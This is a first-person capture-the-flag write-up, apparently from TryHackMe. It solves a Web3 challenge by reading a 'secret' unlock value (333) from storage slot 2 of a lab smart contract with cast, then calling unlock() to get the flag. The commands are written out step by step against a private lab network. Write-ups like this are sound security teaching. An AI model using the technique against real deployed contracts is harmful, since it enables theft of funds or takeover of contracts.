The goal of this project was to audit and exploit a vulnerability in a smart contract deployed on the DarkInject blockchain in order to gain access to a hidden flag. This was done to demonstrate potential risks and weaknesses in Web3 applications and to improve the overall security of blockchain ecosystems.

Description (from a first-person perspective):
I discovered a smart contract deployed on a private network called DarkInject. Initial reconnaissance suggested that it might have a vulnerability related to storage layout. I decided to investigate further. Here's a step-by-step account of how I exploited it and retrieved the flag.

Steps and Explanation:
1. Connecting to the RPC and API
RPC_URL=http://10.10.204.8:8545
API_URL=http://10.10.204.8
I set environment variables to interact with the blockchain through RPC and a web API.

2. Retrieving Private Key, Contract Address, and Player Address

PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
Using the API, I fetched the player's wallet details and the smart contract address needed to interact with the system.

3. Checking if the Challenge Is Solved

is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
echo "Check if is solved: $is_solved"
At this stage, the result was false, confirming the challenge had not yet been solved.

4. Analyzing Contract Storage

cast storage $CONTRACT_ADDRESS 2 --rpc-url $RPC_URL
I examined storage slot 2, which returned:

0x000000000000000000000000000000000000000000000000000000000000014d
In hexadecimal, 0x14d equals 333. This looked like a potential "unlock key".

5. Unlocking the Contract

cast send $CONTRACT_ADDRESS "unlock(uint256)" 333 --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy
I sent a transaction calling the unlock() function with this value. The transaction succeeded (status: 1 (success)).

6. Verifying if the Challenge Was Solved

cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL
The contract now returned true, indicating successful exploitation.

7. Retrieving the Flag

cast call $CONTRACT_ADDRESS "getFlag()(string)" --rpc-url $RPC_URL
Flag:
"THM{web3_h4ck1ng_code}"
📌 Conclusion:
I successfully analyzed and exploited the contract by reading from Ethereum storage. The key to solving the challenge was reading slot 2, which contained the magic number 333. Calling the unlock() function with this value unlocked the contract and revealed the flag.

